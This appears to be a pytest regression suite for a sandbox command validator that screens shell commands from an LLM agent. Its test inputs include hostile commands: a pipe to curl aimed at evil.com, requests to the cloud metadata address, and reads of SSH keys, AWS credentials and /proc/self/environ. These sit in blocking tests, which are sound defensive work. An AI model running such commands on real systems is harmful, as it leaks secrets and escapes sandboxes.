"""PathRewritingBackend._validate_command 安全回归测试。

覆盖 S4 + M6 + M9 三个 P0 修复:
- S4:curl / wget 不在白名单,且命令字符串里任何 http(s):// URL
  都被 SSRFValidator 兜底(内网 / 云元数据 / localhost 拒)
- M6:`~` / `$HOME` / `${VAR}` / `$VAR` / `$(...)` / 反引号都拦,
  防止 LLM 用路径展开绕开 `/skills/` `/tmp/` 路径沙箱
- M9:`/proc/self/` / `/dev/fd/` / `/dev/shm/` 三个危险前缀从
  路径白名单移除,任何 `/proc/...` / `/dev/fd/...` 都拒

锁定行为:
- 命令字符串 / 路径展开 / 网络目标 三类 bypass 一律 PermissionError
- `ls /skills/...` / `cat /tmp/x` / `echo hello` 等正常用法仍放行
- 逃生口 OPSPILOT_PATH_REWRITE_DISABLE_CURL_BLOCK=1 时 curl/wget 不再被黑名单拦
"""
from __future__ import annotations

import os
import sys
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest


pytestmark = pytest.mark.unit


@pytest.fixture
def PathRewritingBackend():
    """在测试期间解除 conftest 对 deepagents.backends.protocol 的 mock,
    拿到真正的 PathRewritingBackend 类(conftest 用 MagicMock 替了父类,
    导致 PathRewritingBackend 整个变成 MagicMock 树,无法直接用)。

    解除 mocks 之后,`PathRewritingBackend` 是一个真类,继承真的
    SandboxBackendProtocol。我们用 SimpleNamespace 充当 self(self 只需要
    `_ALLOWED_COMMANDS` / `_BLOCKED_PATTERNS` 两个类属性即可,_validate_command
    不调用任何实例方法)。
    """
    # 清掉 conftest 设的 MagicMock,触发 deepagents 重新 import 拿真模块
    for name in list(sys.modules.keys()):
        if name.startswith("deepagents"):
            del sys.modules[name]
    # 同时把 path_rewriting_backend 自己从缓存里踢掉,下次 import 会用真父类重新执行 class 体
    for name in list(sys.modules.keys()):
        if "path_rewriting_backend" in name:
            del sys.modules[name]

    from apps.opspilot.services.skill_executor.path_rewriting_backend import (
        PathRewritingBackend as _Cls,
    )
    assert isinstance(_Cls, type), (
        f"PathRewritingBackend 应该是真类,实际 {type(_Cls).__name__}——"
        "检查 conftest 的 mock 是否还在干扰"
    )
    return _Cls


def _make_self(Cls) -> SimpleNamespace:
    """构造一个 self 替身:SimpleNamespace 装上 _ALLOWED_COMMANDS /
    _BLOCKED_PATTERNS 这两个类属性。_validate_command 不调任何实例方法,
    所以这个 self 足够用。
    """
    return SimpleNamespace(
        _ALLOWED_COMMANDS=Cls._ALLOWED_COMMANDS,
        _BLOCKED_PATTERNS=Cls._BLOCKED_PATTERNS,
    )


def _validate(Cls, command: str) -> None:
    """模拟 deepagents 调用:重写 + 校验。"""
    from apps.opspilot.services.skill_executor.path_rewriting_backend import (
        rewrite_sandbox_paths,
    )
    # 任意 sandbox 路径,_validate_command 内部不读 self._sandbox_dir /
    # self._skills_root(只查 _ALLOWED_COMMANDS / _BLOCKED_PATTERNS)
    rewritten = rewrite_sandbox_paths(command, "/tmp/sandbox", "/tmp/skills")
    self_obj = _make_self(Cls)
    Cls._validate_command(self_obj, rewritten, original=command)


# =========================================================================
# S4:curl / wget 不在白名单 + SSRF 兜底
# =========================================================================


def test_curl_command_blocked(tmp_path, PathRewritingBackend):
    """curl 不在白名单,直接被首 token 检查拦下。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="curl"):
        _validate(PathRewritingBackend, "curl https://example.com/")


def test_wget_command_blocked(tmp_path, PathRewritingBackend):
    """wget 同上。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="wget"):
        _validate(PathRewritingBackend, "wget https://example.com/file.txt")


def test_curl_pipe_blocked_by_blacklist(tmp_path, PathRewritingBackend):
    """`cat|curl` / `cat|wget` 类管道也被 _BLOCKED_PATTERNS 拦(防止 LLM 用
    白名单命令当管道前缀绕开)。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"\\\\bcurl\\\\b|\\\\bwget\\\\b"):
        _validate(PathRewritingBackend, "cat /tmp/x | curl https://evil.com/")


def test_curl_in_command_args_blocked(tmp_path, PathRewritingBackend):
    """Python 调 urllib 的间接绕道不被 `\\bcurl\\b` 黑名单命中(没字面 curl),
    但 SSRFValidator 兜底会拦截云元数据 URL — 双层防御任意一层兜住。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="网络目标被 SSRF 拦截"):
        _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')\"")


def test_ssrf_169_metadata_blocked(tmp_path, PathRewritingBackend):
    """SSRFValidator 兜底:云元数据 169.254.169.254 直接拒(validate_llm_endpoint 模式
    也只挡云元数据,内网/127.x/localhost 全放)。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="网络目标被 SSRF 拦截"):
        _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')\"")


def test_ssrf_localhost_allowed(tmp_path, PathRewritingBackend):
    """LLM 端点宽松模式:127.0.0.1 / localhost / 内网放行(走系统白名单管控)。
    skill 沙箱要调本地 k8s API / 内部服务,所以默认放内网。"""
    backend = _make_self(PathRewritingBackend)
    # 不抛 — 内网地址在 LLM 端点模式下被允许
    _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://localhost:8080/')\"")
    _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://127.0.0.1:32955/')\"")


def test_ssrf_private_10_allowed(tmp_path, PathRewritingBackend):
    """LLM 端点宽松模式:10.x / 172.16.x / 192.168.x 放行(企业内网常见)。"""
    backend = _make_self(PathRewritingBackend)
    # 用 SSRF 不会拒的内网地址(走白名单命令 wget 不会触发黑名单字面拦)
    _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://10.0.0.1/api')\"")


# =========================================================================
# M6:路径展开 / 命令替换
# =========================================================================


def test_tilde_expansion_blocked(tmp_path, PathRewritingBackend):
    """`~/.ssh/id_rsa` 等隐藏文件路径被 _BLOCKED_PATTERNS 拦。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"~"):
        _validate(PathRewritingBackend, "cat ~/.ssh/id_rsa")


def test_tilde_only_blocked(tmp_path, PathRewritingBackend):
    """`~/path` 形式(`~` 后跟 `/` 再跟任意字符)也算"展开",一拦。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"~"):
        _validate(PathRewritingBackend, "cat ~/secrets")


def test_dollar_home_blocked(tmp_path, PathRewritingBackend):
    """`$HOME` 环境变量展开被拦。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"\$HOME"):
        _validate(PathRewritingBackend, "cat $HOME/.aws/credentials")


def test_dollar_brace_blocked(tmp_path, PathRewritingBackend):
    """`${HOME}` / `${PATH}` 形式被拦。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"\$\{"):
        _validate(PathRewritingBackend, "cat ${HOME}/.ssh/id_rsa")


def test_dollar_var_blocked(tmp_path, PathRewritingBackend):
    """`$PATH` / `$SECRET` / `$USER` 等无大括号形式被拦。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"\$[A-Z_]"):
        _validate(PathRewritingBackend, "cat $PATH/etc/passwd")


def test_dollar_paren_blocked(tmp_path, PathRewritingBackend):
    """`$(...)` 命令替换被拦(防止 `cat $(echo /etc/passwd)` 绕开)。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"\$\("):
        _validate(PathRewritingBackend, "cat $(echo /etc/passwd)")


def test_backtick_blocked(tmp_path, PathRewritingBackend):
    """反引号命令替换被拦(防止 `` cat `echo /etc/passwd` `` 绕开)。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match=r"`"):
        _validate(PathRewritingBackend, "cat `echo /etc/passwd`")


# =========================================================================
# M9:`/proc` / `/dev/fd/` / `/dev/shm/` 危险前缀
# =========================================================================


def test_proc_self_environ_blocked(tmp_path, PathRewritingBackend):
    """`/proc/self/environ` 读 host 进程 environ(拿 SECRET_KEY/DB_PASSWORD)拒。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="拒绝 host 路径"):
        _validate(PathRewritingBackend, "cat /proc/self/environ")


def test_proc_cpuinfo_blocked(tmp_path, PathRewritingBackend):
    """`/proc/cpuinfo` / `/proc/meminfo` 等整 /proc 前缀都拒。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="拒绝 host 路径"):
        _validate(PathRewritingBackend, "cat /proc/cpuinfo")
    with pytest.raises(PermissionError, match="拒绝 host 路径"):
        _validate(PathRewritingBackend, "cat /proc/meminfo")


def test_dev_fd_blocked(tmp_path, PathRewritingBackend):
    """`/dev/fd/N` 反推进程打开文件,拒。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="拒绝 host 路径"):
        _validate(PathRewritingBackend, "cat /dev/fd/0")


def test_dev_shm_blocked(tmp_path, PathRewritingBackend):
    """`/dev/shm/...` 跨进程共享内存,拒。"""
    backend = _make_self(PathRewritingBackend)
    with pytest.raises(PermissionError, match="拒绝 host 路径"):
        _validate(PathRewritingBackend, "cat /dev/shm/secret")


# =========================================================================
# 正常用法仍放行(回归)
# =========================================================================


def test_normal_commands_still_allowed(tmp_path, PathRewritingBackend):
    """核心白名单命令 + 沙箱内路径仍放行(防止修过头误伤正常用法)。"""
    backend = _make_self(PathRewritingBackend)
    # 应不抛
    _validate(PathRewritingBackend, "ls /skills/foo")
    _validate(PathRewritingBackend, "cat /tmp/x")
    _validate(PathRewritingBackend, "echo hello")
    _validate(PathRewritingBackend, "grep pattern /skills/x")
    _validate(PathRewritingBackend, "python3 /skills/script.py")
    _validate(PathRewritingBackend, "node /skills/app.js")


def test_https_external_url_via_python_still_validated(tmp_path, PathRewritingBackend):
    """公网 URL 不会触发 SSRF 拦截(但仍被 _BLOCKED_PATTERNS 拦 curl/wget 字面)。
    注意:外网 https URL 通过 `python3 -c` 调 urllib 仍要过 SSRFValidator,
    公网不在黑名单网段,应放行。"""
    backend = _make_self(PathRewritingBackend)
    # 不抛 — 公网 URL 通过 SSRF
    _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('https://api.github.com/')\"")


# =========================================================================
# 逃生口:admin 配置(留作后续 PR,需要先在 source 实现
# OPSPILOT_PATH_REWRITE_DISABLE_CURL_BLOCK env var 读取 + 模块加载时机)
# =========================================================================

